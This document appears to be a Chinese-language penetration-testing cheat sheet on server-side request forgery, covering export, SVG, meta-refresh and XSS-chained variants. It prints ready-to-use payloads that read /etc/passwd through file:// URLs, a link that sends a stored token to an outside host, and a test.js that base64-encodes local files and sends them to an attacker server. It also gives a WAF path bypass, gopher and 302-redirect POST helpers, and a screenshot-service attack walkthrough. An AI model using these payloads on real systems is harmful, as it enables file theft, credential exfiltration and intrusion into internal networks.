# SSRF

web服务器经常需要从别的服务器获取数据，比如文件载入、图片拉取、图片识别等功能，如果获取数据的服务器地址可控，攻击者就可以通过web服务器自定义向别的服务器发出请求。因为web服务器常搭建在DMZ区域，因此常被攻击者当作跳板，向内网服务器发出请求。

常见的ssrf漏洞场景（所有需要输入url的地方都可以尝试ssrf，将url改成dnslog地址，验证请求IP是否来自web服务器）：

* 远程图片拉取
* xls，doc等文件预览
* 头像加载
* 其他网站的访问截图

ssrf常用的协议：http/https、dict、file、gopher、sftp、ldap、tftp

## 漏洞检测及利用

任何需要传入URL的接口都有可能出现ssrf漏洞，可根据实际业务场景对功能接口进行漏洞验证。ssrf漏洞可分为有回显型和无回显型，有回显型ssrf可以直接通过页面加载出目标资产，可先尝试加载http://www.baidu.com 页面确认有ssrf，如果成功的话，可进一步将百度换成内网IP，通过fuzz扫描内网资产。


无回显型ssrf的检测需要先配合dnslog平台，测试dnslog平台能否获取到服务器的访问记录，如果没有对应记录，也可能是服务器不出网造成的，利用时可以通过请求响应时间判断内网资产是否存在，然后再利用内网资产漏洞（比如redis以及常见可RCE的web框架）证明漏洞的有效性。

## 导出功能SSRF

有些网站存在功能，能够将一些将数据分析的表格导出为pdf或者图片，当POST数据包中，以html文件内容作为传输，则这里可能存在ssrf漏洞

我们将html内容修改为

    svg><iframe src="攻击者服务器ip" width="800" height="850"/></svg>
    
通过攻击者服务器进行302重定向

    <iframe+src=攻击者服务器302重定向的地址">
     
    原理：
    通过header设置Location: file:///etc/passwd
    
常规payload

    <iframe src="file:///etc/password">
    document.location
    <img src=x onerror="document.write(document.location)"/>
    <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
    <link rel=attachment href="file:///etc/passwd">
    <img src=x onerror=document.write(window.location)>
    
## SVG SSRF

由于 SVG 的功能十分丰富，所以能够处理SVG 的服务器就很有可能遭受到 SSRF、XSS、RCE 等的攻击，特别是在没有禁用一些特殊字符的情况下。

svg攻击payload

    https://github.com/allanlw/svg-cheatsheet

## meta refresh

当一些特殊标签比如,等被禁用后，我们可以使用0秒刷新请求元数据，以下为具体payload

    <meta http-equiv="refresh" content="0;url=http://metadata.tencentyun.com/latest/meta-data" />
    
## 配合XSS

    xss读取本地执行目录 然后可以尝试读取该目录下源文件
    默认存在同源策略不允许直接跨目录实现文件读取。只能读取web目录下的，绕过方法：
     
    <script>x=new XMLHttpRequest;x.onload=function()
    {document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
     
    <a href=\"javascript:var xhr=new XMLHttpRequest(); xhr.open('GET', 'https://acnjnlnopp.dgrh3.cn/'+localStorage.getItem('SCW__TOKEN__'), true); xhr.send();\">aaa</a>
    
## 外带平台利用

也可用户ssrf配合存储型xss

    poc:
    <img src=x onerror="document.write('<script src=http://攻击者服务器ip9/test.js></script>')"/>
     
    通过oob实现location重定向file:/// 实现绕过浏览器同源策略限制加载到本地文件。
    ####cat test.js
    function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="反连服务器ip地址?data='+b64+'"></iframe>');
    }
    var oReq = new XMLHttpRequest();
    oReq.addEventListener("load", reqListener);
    oReq.open("GET", "file:///etc/passwd");
    oReq.send();
    
oob平台将收到bs4的payload。

## 场景

在js中发现接口
通过接口名称大概知道是截图功能的接口，后接的url参数是可控的，将url地址改为www.baidu.com,响应包返回的数据中给出了截图地址
访问该图片地址直接下载值本地，发现正是百度的首页，url改为ceye地址，通过http记录发现UA是基于Linux上chrome内核的浏览器：
猜测请求过程：客户端通过接口传入url→web服务器接收到地址后用浏览器访问该url→访问后将网页详情截图并上传cdn→接口请求成功响应并返回截图保存地址
 
chrome浏览器默认支持：Http，Https，File，Ftp，Linux环境下先尝试读取/etc/passwd,
将url改成/etc/./././././././passwd可绕过该waf，发现部分用户的hash：
 
因为当前用户权限不够，无法读/root/.bash_history和shadow文件，也不知道web源码的绝对路径无法读配置文件，此时还可以读取/etc/hosts文件获取部分内网web资产：

## 无回显SSRF

平时遇到无回显SSRF，还可以尝试寻找内网的Confluence, Artifactory, Jenkins, 和JAMF等资产，这篇文章是专门介绍bind ssrf利用技巧的，可以作为参考：

    https://github.com/assetnote/blind-ssrf-chains
    
在GitHub搜索厂商域名关键字+jenkins、wiki、oa、git、svn等有可能出现在域名中的词，发现jenkins和confluence内网资产：

符号列表利用gopher协议直接发送POST请求。用python脚本生成gopher数据流，参考：

    https://blog.csdn.net/weixin_45887311/article/details/107327706
     
            import urllib.parse
            test =\
            """POST / HTTP/1.1
            Host: 127.0.0.1:8000
            """  
            #以上内容放置请求包内容，注意后面一定要有回车，回车结尾表示http请求结束
            tmp = urllib.parse.quote(test)
            new = tmp.replace('%0A','%0D%0A')
            result = '_'+new
            print(result)
            
除了发出HTTP请求外，gopher协议还常被用来攻击内网redis、Zabbix、FastCGI、mysql等服务，利用工具：

    https://github.com/tarunkant/Gopherus
    
ssrf不支持gopher协议时可考虑利用302跳转。条件：ssrf支持302跳转。参考：

    https://zone.huoxian.cn/d/392
     
    https://www.t00ls.cc/articles-62210.html
    
302.php发出POST请求：

        <?php
        /**
         * 发送post请求
         * @param string $url 请求地址
         * @param array $post_data post键值对数据
         * @return string
         */
        function send_post($url, $post_data) {
            $postData = http_build_query($post_data);
            $options = array(
                'http' => array(
                    'method' => 'POST',
                    'header' => 'Content-type:application/x-www-form-urlencoded',
                    'content' => $postData,
                    'timeout' => 15 * 60 // 超时时间（单位:s）
                )
            );
            $context = stream_context_create($options);
            $result = file_get_contents($url, false, $context);
        
            return $result;
        }
        
        //使用方法
        $post_data = array(
            'username' => 'stclair2201',
            'password' => 'handan'
        );
        send_post('http://vpsip:8000', $post_data);
        ?>
        
结合csrf自动提交POST表单。条件：支持跳转，无refer限制。前文提到，目标服务器可能是通过浏览器访问后再截图，因此重定向是可以实现的，这里提供一种比302跳转更方便的解决方案，直接用burp生成csrf poc，然后加入一段js来自动提交表单，这样也类似于302重定向的利用方式了。

当前场景，结合csrf自动提交POST表单的方法是最方便的，因为是半回显ssrf，命令执行结果在截图中无法提现，可通过dnslog将命令执行结果外带

    <script>
    document.forms[0].submit();
    </script>